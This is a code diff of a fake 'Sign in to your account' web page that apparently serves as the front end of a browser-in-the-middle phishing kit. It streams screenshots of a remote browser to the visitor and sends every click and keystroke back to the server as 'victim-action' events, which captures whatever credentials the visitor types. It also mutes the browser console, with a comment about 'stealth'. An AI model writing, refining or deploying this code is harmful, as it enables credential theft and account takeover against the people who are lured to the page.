@@ -4,12 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sign in to your account</title>
-    
-    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p6DQAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsPV8L3GVAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAZ0lEQVRYhe2W0QoAIAhD7f8/unvYQ6clS7pgHwaatpXpYpSImYmJiYmJiYmJiYmJiYmJicloZp6at6Lp9ZqZp+ataHq9Zual+SuaXq+ZeWn+iqbXa2Zemr+i6fWamZfmr2h6vWbmf7Ef570vS87pL9AAAAAASUVORK5CYII=">
-    
     <style>
-        * { box-sizing: border-box; }
-        
         body, html { 
             background: #000; 
             margin: 0; 
@@ -20,73 +15,60 @@
             display: flex; 
             justify-content: center; 
             align-items: center; 
+            color: #222; /* Dark text for the status message */
+            font-family: monospace;
         }
 
-        /* Container ensures the image keeps its 16:9 aspect ratio without cropping */
         #mirror { 
             max-width: 100%; 
             max-height: 100%; 
-            width: auto; 
-            height: auto; 
+            display: none; /* Hidden until first frame arrives */
             object-fit: contain; 
             cursor: crosshair; 
-            image-rendering: -webkit-optimize-contrast;
-            -webkit-user-drag: none; 
-            user-select: none; 
-            -webkit-user-select: none;
-            touch-action: none; /* Prevents mobile browser from intercepting touches */
+            touch-action: none;
         }
 
-        .status-bar { 
-            position: absolute; 
-            opacity: 0; 
-            pointer-events: none; 
+        #status {
+            position: absolute;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
-    <div class="status-bar"><span id="msg">IDLE</span></div>
-    
+    <div id="status">INITIALIZING_SECURE_STREAM...</div>
     <img id="mirror" src="" draggable="false" />
 
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
-        // Mute browser console for production lab stealth
+        // Mute logs
         (function() {
             const noop = () => {};
             ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
         })();
 
-        const socket = io({ 
-            transports: ['websocket'], 
-            upgrade: false,
-            reconnection: true 
-        });
-
+        const socket = io({ transports: ['websocket'], upgrade: false });
         const img = document.getElementById('mirror');
+        const status = document.getElementById('status');
 
         socket.on('browser-render', (data) => {
             if (data.screenshot) {
+                if (img.style.display !== 'block') {
+                    img.style.display = 'block';
+                    status.style.display = 'none';
+                }
                 img.src = 'data:image/jpeg;base64,' + data.screenshot;
             }
         });
 
-        // Click Logic (Now calibrated for responsive scaling)
         img.addEventListener('pointerdown', (e) => {
             const rect = img.getBoundingClientRect();
-            
-            // Calculate ratio between the 1280x720 internal canvas and the actual displayed size
             const x = (e.clientX - rect.left) * (1280 / rect.width);
             const y = (e.clientY - rect.top) * (720 / rect.height);
-            
             socket.emit('victim-action', { type: 'click', x, y });
         });
 
         window.addEventListener('keydown', (e) => {
-            // Prevent scrolling on key actions
-            const blocked = ["ArrowUp", "ArrowDown", "Space", "Tab"];
-            if (blocked.includes(e.code)) e.preventDefault();
-            
+            if (["ArrowUp", "ArrowDown", "Space", "Tab"].includes(e.code)) e.preventDefault();
             socket.emit('victim-action', { type: 'key', key: e.key });
         });
     </script>
